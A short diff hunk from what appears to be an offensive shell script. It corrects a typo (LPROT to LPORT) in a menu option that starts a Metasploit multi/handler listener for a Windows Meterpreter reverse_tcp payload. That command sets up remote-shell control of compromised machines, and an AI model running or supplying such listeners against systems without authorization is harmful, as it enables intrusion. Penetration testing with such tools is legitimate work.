@@ -356,7 +356,7 @@ start_msf(){
     start_msf
     ;;
     "3" )
-    msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $myip;set LPROT $myport;run;"
+    msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $myip;set LPORT $myport;run;"
     start_msf
     ;;
     * )
